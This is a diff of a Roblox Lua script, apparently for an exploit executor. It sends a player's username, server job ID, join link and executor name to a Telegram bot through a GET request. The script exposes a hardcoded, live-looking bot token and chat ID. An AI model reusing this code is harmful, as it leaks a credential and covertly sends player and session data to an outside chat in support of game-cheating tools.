@@ -4,7 +4,7 @@
 
 local BOT_TOKEN = "8506651300:AAEuhXSs86i1x_yCznkfefjz8vIz9gGTqmg"
 local SERVER = "https://remote-roblox.vercel.app"
-local chatId = 7777604508
+local chatId = "7777604508"
 
 --======================--
 --  HTTP WRAPPER
@@ -70,54 +70,51 @@ end
 --============================================--
 
 local function sendInfo()
-    local HttpS = game:GetService("HttpService")
-    local marketplace = game:GetService("MarketplaceService")
-    local info = marketplace:GetProductInfo(game.PlaceId)
+    local HS = game:GetService("HttpService")
+    local MP = game:GetService("MarketplaceService")
+    local info = MP:GetProductInfo(game.PlaceId)
 
     local placeName = info.Name or "Unknown"
     local placeId = game.PlaceId
     local jobId = game.JobId
 
-    local joinLink =
-        "https://www.roblox.com/games/"
-        .. placeId
-        .. "/?privateServerLinkCode="
-        .. HttpS:UrlEncode(jobId)
+    local joinLink = "https://www.roblox.com/games/" ..
+        placeId .. "/?privateServerLinkCode=" .. HS:UrlEncode(jobId)
 
-    local playerCount = #Players:GetPlayers()
+    local players = #Players:GetPlayers()
     local maxPlayers = Players.MaxPlayers
     local ping = math.floor(game:GetService("Stats")
         .Network.ServerStatsItem["Data Ping"]:GetValue())
 
     local exec = (identifyexecutor and identifyexecutor()) or "N/A"
 
+    -- MESSAGE TANPA NEWLINE (WAJIB)
     local message =
-        "ℹ️ INFO PLAYER: " .. username .. "\n\n" ..
-        "🗺 Map: " .. placeName .. "\n" ..
-        "🏷 PlaceId: " .. placeId .. "\n" ..
-        "🌀 JobId: " .. jobId .. "\n" ..
-        "🔗 Join: " .. joinLink .. "\n\n" ..
-        "👥 Players: " .. playerCount .. "/" .. maxPlayers .. "\n" ..
-        "📡 Ping: " .. ping .. "ms\n" ..
-        "⚙ Executor: " .. exec
+        "INFO PLAYER: " .. username ..
+        " | Map: " .. placeName ..
+        " | PlaceId: " .. placeId ..
+        " | JobId: " .. jobId ..
+        " | Join: " .. joinLink ..
+        " | Players: " .. players .. "/" .. maxPlayers ..
+        " | Ping: " .. ping .. "ms" ..
+        " | Executor: " .. exec
 
-    -- BODY TELEGRAM (POST)
-    local body = {
-        chat_id = tonumber(chatId), -- WAJIB number
-        text = message
-    }
+    -- WAJIB 2X ENCODE BIAR AMAN
+    local encodedMessage = HS:UrlEncode(HS:UrlEncode(message))
 
-    local jsonBody = HttpS:JSONEncode(body)
+    local url =
+        "https://api.telegram.org/bot" ..
+        BOT_TOKEN ..
+        "/sendMessage?chat_id=" ..
+        chatId ..
+        "&text=" ..
+        encodedMessage
 
     pcall(function()
-        game:HttpPost(
-            "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
-            jsonBody,
-            Enum.HttpContentType.ApplicationJson
-        )
+        game:HttpGet(url)
     end)
 
-    debug("Info sent via Telegram API (POST)")
+    print("[INFO SENT GET] -> Telegram")
 end
 
 --============================================--
